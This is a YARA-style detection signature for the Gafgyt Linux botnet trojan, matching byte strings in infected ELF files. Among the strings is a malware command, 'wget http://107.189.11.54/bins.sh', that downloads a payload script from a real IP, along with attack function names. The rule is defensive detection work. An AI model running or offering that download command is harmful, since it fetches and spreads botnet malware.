
rule Trojan_Linux_Gafgyt_AC_MTB{
	meta:
		description = "Trojan:Linux/Gafgyt.AC!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,02 00 02 00 04 00 00 "
		
	strings :
		$a_00_0 = {6c 69 62 63 2f 73 79 73 64 65 70 73 2f 6c 69 6e 75 78 2f 73 70 61 72 63 2f 63 72 74 69 2e 53 } //1 libc/sysdeps/linux/sparc/crti.S
		$a_00_1 = {63 75 72 6c 5f 77 67 65 74 5f 61 74 74 61 63 6b } //1 curl_wget_attack
		$a_00_2 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 31 30 37 2e 31 38 39 2e 31 31 2e 35 34 2f 62 69 6e 73 2e 73 68 } //1 wget http://107.189.11.54/bins.sh
		$a_00_3 = {61 74 74 61 63 6b 5f 6d 65 74 68 6f 64 73 2e 63 } //1 attack_methods.c
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1) >=2
 
}